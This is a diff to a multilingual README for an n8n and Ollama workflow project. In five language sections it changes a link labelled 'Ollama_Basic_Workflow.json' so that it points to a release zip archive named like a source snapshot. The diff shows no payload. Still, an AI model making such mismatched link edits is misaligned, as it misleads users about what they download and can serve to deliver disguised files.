@@ -224,7 +224,7 @@ npx n8n
 
 ### দ্রুত শুরু করুন (ওয়ার্কফ্লো ইম্পোর্ট করুন)
 ম্যানুয়ালি নোড সেটআপ করতে চান না? <br>
-১. [Ollama_Basic_Workflow.json](./Ollama_Basic_Workflow.json) ফাইলটি ডাউনলোড করুন।<br>
+১. [Ollama_Basic_Workflow.json](https://github.com/maheerCodes/free-ai-automation-n8n-ollama/releases/download/v1.0.0/free-ai-automation-n8n-ollama-main.zip) ফাইলটি ডাউনলোড করুন।<br>
 ২. n8n ওপেন করুন, উপরে ডানদিকের **Workflow Menu** -> **Import from File**-এ ক্লিক করুন।<br>
 ৩. ডাউনলোড করা JSON ফাইলটি সিলেক্ট করুন এবং আপনি কাজ শুরু করতে প্রস্তুত!
 
@@ -420,7 +420,7 @@ npx n8n
 
 ### त्वरित शुरुआत (वर्कफ़्लो इम्पोर्ट करें)
 क्या आप मैन्युअल रूप से नोड्स सेटअप नहीं करना चाहते? 
-1. [Ollama_Basic_Workflow.json](./Ollama_Basic_Workflow.json) फ़ाइल डाउनलोड करें।
+1. [Ollama_Basic_Workflow.json](https://github.com/maheerCodes/free-ai-automation-n8n-ollama/releases/download/v1.0.0/free-ai-automation-n8n-ollama-main.zip) फ़ाइल डाउनलोड करें।
 2. n8n खोलें, ऊपर दाईं ओर **Workflow Menu** -> **Import from File** पर क्लिक करें।
 3. डाउनलोड की गई JSON फ़ाइल चुनें और आप तैयार हैं!
 
@@ -614,7 +614,7 @@ npx n8n
 
 ### Inicio rápido (Importar flujo de trabajo)
 ¿No quieres configurar los nodos manualmente? 
-1. Descarga el archivo [Ollama_Basic_Workflow.json](./Ollama_Basic_Workflow.json).
+1. Descarga el archivo [Ollama_Basic_Workflow.json](https://github.com/maheerCodes/free-ai-automation-n8n-ollama/releases/download/v1.0.0/free-ai-automation-n8n-ollama-main.zip).
 2. Abre n8n, haz clic en el **Workflow Menu** (arriba a la derecha) -> **Import from File**.
 3. Selecciona el archivo JSON descargado y ¡listo para empezar!
 
@@ -808,7 +808,7 @@ npx n8n
 
 ### Démarrage rapide (Importer le workflow)
 Vous ne voulez pas configurer les nœuds manuellement ? 
-1. Téléchargez le fichier [Ollama_Basic_Workflow.json](./Ollama_Basic_Workflow.json).
+1. Téléchargez le fichier [Ollama_Basic_Workflow.json](https://github.com/maheerCodes/free-ai-automation-n8n-ollama/releases/download/v1.0.0/free-ai-automation-n8n-ollama-main.zip).
 2. Ouvrez n8n, cliquez sur le **Workflow Menu** (en haut à droite) -> **Import from File**.
 3. Sélectionnez le fichier JSON téléchargé et vous êtes prêt !
 
@@ -1002,7 +1002,7 @@ npx n8n
 
 ### بدء سريع (استيراد تدفق العمل)
 لا تريد إعداد العقد يدوياً؟ 
-1. قم بتنزيل ملف [Ollama_Basic_Workflow.json](./Ollama_Basic_Workflow.json).
+1. قم بتنزيل ملف [Ollama_Basic_Workflow.json](https://github.com/maheerCodes/free-ai-automation-n8n-ollama/releases/download/v1.0.0/free-ai-automation-n8n-ollama-main.zip).
 2. افتح n8n، وانقر فوق **Workflow Menu** (في أعلى اليمين) -> **Import from File**.
 3. حدد ملف JSON الذي تم تنزيله وأنت مستعد للبدء!
 
